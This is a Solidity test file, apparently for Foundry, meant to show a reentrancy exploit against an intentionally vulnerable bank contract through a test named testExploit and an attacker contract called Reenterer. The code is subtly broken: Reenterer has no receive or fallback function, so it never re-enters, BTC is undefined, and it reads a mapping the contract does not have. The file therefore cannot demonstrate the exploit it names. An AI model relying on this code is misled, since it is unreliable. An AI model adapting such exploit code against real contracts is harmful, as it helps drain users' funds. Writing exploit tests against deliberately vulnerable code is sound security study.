// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract ReenteringReceiver is BaseTestWithBalanceLog, VulnerableBank {
    address target;

    function setUp() public override {
        target = address(new VulnerableBank());
        fundAccount(target);
    }

    function testExploit() public {
        vm.startPrank(target);
        // Deploy re-entering receiver contract if needed
        Reenterer receiver = new Reenterer(address(target), target);
        receiver.triggerReenter();
        vm.stopPrank();

        assertGt(receiver.balances[target], receiver.initialBalance, "Receiver withdrew more than its original deposit");
    }
}

contract Reenterer {
    address public bank;
    uint256 public initialBalance;

    constructor(address _bank, address attacker) {
        bank = _bank;
        initialBalance = IERC20(BTC).balanceOf(attacker);
        IERC20(BTC).approve(_bank, type(uint256).max);
        IERC20(BTC).transferFrom(attacker, _bank, 1 ether);

        emit log_named_uint("Initial Balance", initialBalance);
    }

    function triggerReenter() external {
        (bool success,) = bank.call(abi.encodeWithSelector(VulnerableBank.withdraw.selector, uint256(1 ether)));
        require(success, "Withdraw call failed");
    }
}